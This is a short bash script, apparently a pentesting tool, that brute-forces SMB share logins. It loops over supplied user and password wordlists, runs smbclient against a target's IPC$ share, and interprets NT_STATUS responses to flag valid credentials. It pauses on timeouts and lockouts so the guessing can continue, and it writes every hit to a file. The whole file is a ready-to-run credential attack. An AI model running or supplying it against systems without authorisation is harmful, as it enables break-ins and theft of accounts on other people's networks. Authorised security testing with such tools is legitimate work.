#!/bin/bash
# simple brute-force script to break into smb shares
# Author: alwayslucky (@maxkleinke)

outfile=credentials.txt
share='IPC$'
ip=$1
userlist=$2
passlist=$3

if [[ $# < 3 ]]; then
    echo "usage: ./brutesmb.sh <ip> <userlist> <pwlist>"
    exit 1
fi

while read usr; do
    echo "brute-forcing user $usr with wordlist $passlist ..."
    while read pwd; do

        output=$(smbclient -U "$usr%$pwd" //$ip/$share -c '')

        while [[ $output == *"NT_STATUS_IO_TIMEOUT"* ]]; do
            echo "Connection timed out ..."
            sleep 3
            output=$(smbclient -U "$usr%$pwd" //$ip/$share -c '')
        done

        if [[ $output == *"NT_STATUS_LOGON_FAILURE"* ]]; then
            continue
        elif [[ -z $output ]]; then
            echo "[+] Valid credentials: $usr, $pwd"
            echo "$usr, $pwd" >> $outfile
        elif [[ $output == *"NT_STATUS_ACCESS_DENIED"* ]]; then
            echo "[*] Access for the share denied. Credentials seem to be valid."
            echo "[+] Credentials: $usr, $pwd"
            echo "$usr, $pwd" >> $outfile
        elif [[ $output == *"NT_STATUS_BAD_NETWORK_NAME"* ]]; then
            echo "[*] Share not found. Credentials seem to be valid."
            echo "[+] Credentials: $usr, $pwd"
            echo "$usr, $pwd" >> $outfile
        elif [[ $output == *"ACCOUNT_LOCKED"* ]]; then
            echo "[-] Account seems to be locked. Pausing for 10 seconds."
            sleep 10
        elif [[ $output == *"NT_STATUS_PASSWORD_MUST_CHANGE"* ]]; then
            echo "[+] Found credentials, however they have to be changed: $usr, $pwd"
            echo "[+] try using smbpasswd -U $usr -r $ip"
            echo "[*] $output"
            echo "Changable Credentials (smbpasswd): $usr, $pwd" >> $outfile
        else
            echo "[-] Some error occoured"
            echo "[*] $output"
            echo "[*] For credentials: $usr, $pwd"
        fi

    done < $passlist
done < $userlist

echo "Done."
